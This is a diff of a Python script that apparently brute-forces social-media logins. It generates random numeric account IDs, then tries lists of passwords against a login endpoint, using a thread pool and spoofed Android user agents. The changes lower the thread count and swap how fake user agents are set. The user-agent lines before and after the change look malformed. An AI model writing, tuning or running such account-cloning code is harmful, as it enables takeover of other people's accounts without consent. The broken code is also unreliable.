@@ -1,6 +1,5 @@
 import os, time, random, string, sys, uuid, json
 from concurrent.futures import ThreadPoolExecutor
-from fake_useragent import UserAgent
 
 import requests
 
@@ -71,7 +70,7 @@ def randomClone():
         numb = ''.join(random.choice(string.digits) for _ in range(7))
         unique_numbers.add(numb)
     
-    with ThreadPoolExecutor(max_workers=30) as FAYEQ_executor:
+    with ThreadPoolExecutor(max_workers=10) as FAYEQ_executor:
         clear()
         line()
         print(' | Method : Random Cloning')
@@ -90,8 +89,8 @@ def startClone(ids, passwords):
     
     for pas in passwords:
         try:
-            useragent = "ua = UserAgent()
-									user_agent = ua.random"
+            useragent ="Mozilla/6.0 (Linux; Android 11: K)","Mozilla/7.0 (Linux; Android 12: K)","Mozilla/5.0 (Linux; Android 9: K)"
+
             data = {
                 'adid': str(uuid.uuid4()),
                 'format': 'json',
